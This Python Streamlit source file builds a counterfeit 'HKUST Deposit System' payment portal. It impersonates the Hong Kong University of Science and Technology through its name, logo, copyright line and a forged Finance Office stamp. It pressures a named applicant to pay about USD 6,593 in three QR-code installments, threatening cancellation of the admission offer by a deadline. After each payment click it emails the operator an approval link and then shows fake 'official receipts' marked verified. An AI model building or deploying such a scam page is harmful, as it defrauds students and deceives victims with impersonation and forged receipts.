import streamlit as st
from datetime import datetime
import time
import os
import requests

# --- 1. Page Config & Professional CSS ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

STATUS_FILE = "payment_status.txt"

def set_status(status):
    with open(STATUS_FILE, "w") as f: f.write(status)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# Handle Admin Approval Link
query_params = st.query_params
action = query_params.get("action")
if action in ["approve1", "approve2", "approve3"]:
    set_status(action.replace("approve", "approved"))
    st.success(f"Stage {action[-1]} Approved!")
    st.stop()

st.markdown("""
<style>
#MainMenu, header, footer, .stDeployButton {visibility: hidden !important;}
[data-testid="stHeader"] {display: none !important;}
.nav-bar { background-color: #003366; padding: 15px 60px; display: flex; align-items: center; color: white; border-bottom: 4px solid #A6937C; }
.system-title { border-left: 2px solid #fff; padding-left: 15px; margin-left: 15px; font-size: 18px; font-weight: 500; }
.loader { border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
.payment-card { background: white; padding: 30px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; }
.info-box { background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }
.deadline-box { color: #d32f2f !important; font-weight: bold; font-size: 15px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 15px 0; border: 1px solid #f5c6cb; line-height: 1.5; }
.receipt-box { background: white; border: 1px solid #003366; padding: 30px; border-radius: 5px; color: #000 !important; }
</style>
""", unsafe_allow_html=True)

# --- 2. Data Definitions ---
PAYER = "XINGSHENG WANG"
HKD_TOTAL = "51,643"
USD_TOTAL = "6,593.21"

# EmailJS Config (Update these with your keys)
USER_ID = "YOUR_PUBLIC_KEY"
SERVICE_ID = "YOUR_SERVICE_ID"
TEMPLATE_ID = "YOUR_TEMPLATE_ID"
MY_URL = "https://streamlit.app" 

# --- 3. UI State ---
if 'step' not in st.session_state: st.session_state.step = "pay1"

# --- 4. Navigation Bar with Local Logo Fix ---
# 這裡使用您上傳的 hkust.png
col_nav1, col_nav2 = st.columns([1, 8])
with col_nav1:
    if os.path.exists("hkust.png"):
        st.image("hkust.png", width=120)
st.markdown(f"""
<div class="nav-bar" style="margin-top:-85px; pointer-events: none;">
<div style="width:120px;"></div> <!-- Spacer for Logo -->
<div class="system-title">Deposit System<br><span style="font-size:12px; font-weight:normal;">Official Payment Portal</span></div>
</div>
""", unsafe_allow_html=True)

# --- 5. Content Logic (All in English) ---

# Checking Screen
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""
<div style="text-align:center; margin-top:100px;">
<div class="loader"></div>
<h2 style="color:#003366;">Verifying Installment {stage}...</h2>
<p style="color:#666;">The Finance Office is verifying your transaction on Payoneer.<br>This page will update automatically once confirmed.</p>
</div>
""", unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}":
        st.session_state.step = f"receipt{stage}"
    st.rerun()

# Stage 1: 1200 USD
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">Payment Plan Confirmation</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments.</p>
<div class="info-box"><b>Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
<div class="deadline-box">
⚠️ URGENT NOTICE:<br>
Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and place in the program.
</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Stage: 1st Installment - USD 1,200.00</p>
</div>""", unsafe_allow_html=True)
        st.image("qr1.png", width=350)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# --- Receipt stages 1 & 2 (Simplified English) ---
elif st.session_state.step == "receipt1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box"><h4 style="text-align:center; color:#003366;">OFFICIAL RECEIPT (STAGE 1)</h4><p><b>Payer:</b> {PAYER}</p><p><b>Received:</b> USD 1,200.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold;">VERIFIED</div></div>""", unsafe_allow_html=True)
        if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"):
            st.session_state.step = "pay2"; st.rerun()

# Stage 2: 3000 USD
elif st.session_state.step == "pay2":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">2nd Installment Payment</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<div class="deadline-box">⚠️ Deadline: 4:00 PM, April 24th.</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 3,000.00</p>
</div>""", unsafe_allow_html=True)
        st.image("qr2.png", width=350)
        if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
            set_status("checking2"); st.session_state.step = "checking2"; st.rerun()

# Stage 3: Final Installment
elif st.session_state.step == "pay3":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">Final Installment Payment</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<div class="deadline-box">⚠️ Final Stage: Complete this to secure your enrollment.</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 2,393.21</p>
</div>""", unsafe_allow_html=True)
        st.image("qr3.png", width=350)
        if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
            set_status("checking3"); st.session_state.step = "checking3"; st.rerun()

# Final Grand Receipt (Simplified English)
elif st.session_state.step == "receipt3":
    st.markdown(f"""
<div style="background:white; border:2px solid #003366; padding:40px; max-width:750px; margin:auto; position:relative;">
<div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
<h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
<p style="font-size:11px; color:#666 !important;">Official Electronic Receipt</p>
</div>
<h3 style="text-align:center; text-decoration: underline;">FULL DEPOSIT RECEIPT</h3>
<br>
<table style="width:100%; color:#000;">
<tr><td><b>Receipt No:</b></td><td style="text-align:right;">UST-FULL-{int(time.time())}</td></tr>
<tr><td><b>Received from:</b></td><td style="text-align:right;">{PAYER}</td></tr>
<tr><td><b>Total Amount:</b></td><td style="text-align:right;"><b>HK$ {HKD_TOTAL} (USD {USD_TOTAL})</b></td></tr>
</table>
<br>
<div style="border:2px solid #d32f2f; color:#d32f2f; padding:8px; width:fit-content; transform:rotate(-5deg); font-weight:bold;">HKUST FINANCE OFFICE<br>PAYMENT VERIFIED</div>
</div>
""", unsafe_allow_html=True)
    st.balloons()

st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
